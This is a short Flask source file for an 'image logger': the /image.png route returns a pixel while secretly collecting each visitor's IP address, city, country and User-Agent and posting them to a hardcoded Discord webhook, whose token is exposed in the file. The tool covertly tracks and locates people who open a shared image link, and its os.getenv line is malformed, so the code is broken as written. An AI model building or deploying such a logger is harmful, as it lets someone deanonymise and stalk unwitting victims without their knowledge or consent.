from flask import Flask, request, send_file
import requests
import os

app = Flask(__name__)

WEBHOOK_URL = os.getenv(https://discord.com/api/webhooks/1378852791472099378/q-M2hWV-VFO_iEXvvKlT_vIODq03J2MuoE1usmCMiKC7sZgHT5k_jCBpOUgs3kO-YURD'')  # Put in Render environment

def get_client_ip(req):
    if req.headers.get('X-Forwarded-For'):
        return req.headers['X-Forwarded-For'].split(',')[0].strip()
    return req.remote_addr

def get_geolocation(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}").json()
        return {
            "ip": ip,
            "country": res.get("country", "Unknown"),
            "city": res.get("city", "Unknown")
        }
    except:
        return {"ip": ip, "country": "Unknown", "city": "Unknown"}

def send_to_discord(ip_info, user_agent):
    msg = (
        f"📸 **Image Accessed!**\n\n"
        f"🌍 **IP:** `{ip_info['ip']}`\n"
        f"🏳️ **Country:** {ip_info['country']}\n"
        f"🏙️ **City:** {ip_info['city']}\n"
        f"🧠 **User-Agent:** `{user_agent}`"
    )
    requests.post(WEBHOOK_URL, json={"content": msg})

@app.route('/image.png')
def serve_image_and_log():
    ip = get_client_ip(request)
    ua = request.headers.get('User-Agent', 'Unknown')
    geo = get_geolocation(ip)
    send_to_discord(geo, ua)
    return send_file('pixel.png', mimetype='image/png')

@app.route('/')
def home():
    return "✅ Image logger online"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
